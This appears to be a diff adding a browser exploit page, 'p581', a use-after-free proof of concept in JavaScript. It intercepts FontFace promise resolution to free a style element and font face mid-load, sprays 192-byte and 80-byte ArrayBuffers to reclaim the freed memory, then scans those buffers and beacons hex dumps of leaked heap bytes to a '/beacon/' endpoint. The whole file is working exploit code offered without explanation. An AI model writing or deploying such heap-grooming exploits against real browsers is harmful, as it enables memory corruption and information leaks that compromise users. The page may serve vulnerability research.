@@ -1,0 +1,65 @@
+<!doctype html><html><head><meta charset="utf-8"><title>p581</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(v,o){var s='';for(var i=0;i<8;i++){s+=('0'+((v[o+i]===undefined?0:v[o+i])&0xff).toString(16)).slice(-2);}return s;}
+var K=16, T=32, styleEl=null, firedHere=false, done=false;
+var S={};
+function setupFace(name, css){
+  styleEl=document.createElement('style');
+  styleEl.textContent=css;
+  document.head.appendChild(styleEl);
+  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  (window.__alive=window.__alive||[]).push(A);
+}
+function installGetter(){
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl){ styleEl.remove(); styleEl.textContent=''; styleEl=null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+      window.__face=[]; window.__tab=[];
+      /* face class first: this is the chunk the freed CSSFontFace leaves */
+      for (var k=0;k<K;k++){ var ab=new ArrayBuffer(192); window.__face.push(new Uint8Array(ab)); }
+      /* then the 80-byte class: the natural client table */
+      for (var k2=0;k2<T;k2++){ var ab2=new ArrayBuffer(80); window.__tab.push(new Uint8Array(ab2)); }
+      b('P581-SPRAY-'+K+'x192-'+T+'x80');
+      try{ document.fonts.check('1em fs0'); }catch(e){}
+      b('P581-CHECK-RETURNED');
+      return undefined;
+    },
+    set:function(){}
+  });
+}
+function scan(tag){
+  if (done) return; done=true;
+  var f=window.__face||[], t=window.__tab||[];
+  var fh=-1, th=-1, ti=0;
+  for (var i=0;i<f.length;i++){ if (f[i][0x58]||f[i][0x59]||f[i][0x5A]||f[i][0x5B]) { fh=i; break; } }
+  for (var j=0;j<t.length;j++){
+    var v=t[j], nz=0;
+    for (var o=0;o<v.length;o++) if (v[o]) nz++;
+    if (nz){ th=j; ti=nz;
+      b('P581-TAB-'+tag+'-b'+j+'-nz'+nz+'-0_'+hex8(v,0)+'-8_'+hex8(v,8)+'-10_'+hex8(v,0x10)+'-18_'+hex8(v,0x18)+'-20_'+hex8(v,0x20)+'-28_'+hex8(v,0x28)+'-30_'+hex8(v,0x30)+'-38_'+hex8(v,0x38)+'-40_'+hex8(v,0x40));
+      break; }
+  }
+  if (fh>=0) b('P581-FACE-'+tag+'-b'+fh+'-58_'+hex8(f[fh],0x58)+'-68_'+hex8(f[fh],0x68)+'-rc_'+f[fh][0]);
+  if (fh<0&&th<0) b('P581-NONE-'+tag);
+}
+function start(){
+  window.__alive=[];
+  done=false; firedHere=false;
+  setupFace('ff0',"@font-face { font-family: fs0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('P581-SETUP');
+  document.fonts.load('1em ff0, fs0','AB').then(function(){ b('P581-RESOLVED'); }, function(){ b('P581-REJECTED'); });
+  setTimeout(function(){ scan('T90'); },90);
+  setTimeout(function(){ scan('T300'); },300);
+}
+function run(){ b('P581-PARSE'); start(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>p581 80-byte table spray</p></body></html>
